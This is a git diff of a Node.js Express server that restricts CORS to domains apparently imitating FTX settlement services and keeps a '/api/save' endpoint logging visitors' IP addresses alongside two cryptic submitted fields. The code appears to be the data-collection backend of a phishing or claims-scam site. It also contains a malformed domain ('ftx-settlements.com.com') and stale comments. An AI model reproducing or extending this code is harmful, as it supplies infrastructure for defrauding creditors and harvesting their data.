@@ -43,10 +43,9 @@ const app = express();
 
 // CORS configuration to allow only a.com
 const corsOptions = {
-  origin: ['https://ftx-settlements.com', 'https://ftx-appointment.com' ],// Allow only requests from a.com
-  methods: ['POST', 'OPTIONS'], // Allow specific methods, like GET and POST
-  allowedHeaders: ['Content-Type', 'Authorization'], // Specify allowed headers,
-  optionSuccessStatus: 200
+  origin: ['https://ftx-allocation.com', 'https://ftx-settlements.com.com' ],// Allow only requests from a.com
+  methods: ['POST'], // Allow specific methods, like GET and POST
+  allowedHeaders: ['Content-Type', 'Authorization'], // Specify allowed headers
 };
 
 // Use CORS middleware
@@ -68,16 +67,7 @@ client.connect()
         console.log("success");
 
 
-
-
-app.options('*', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', 'https://ftx-settlements.com');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  //res.setHeader('Access-Control-Max-Age', '3600'); // Optional: Cache preflight response for 1 hour
-  res.status(200).send(); // No content
-});
-
+      
 app.post("/api/save", rateLimit, async (req, res) => {
     const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
     let { u, i } = req.body;
@@ -115,10 +105,9 @@ app.post("/api/save", rateLimit, async (req, res) => {
 
     res.sendStatus(200);
 });
-module.exports = app; ///delete me
+
 
 app.listen(4000, () => console.log("Server running on port 4000"));
-  
     })
 .catch((err) => {
     console.log("error happened ", err);
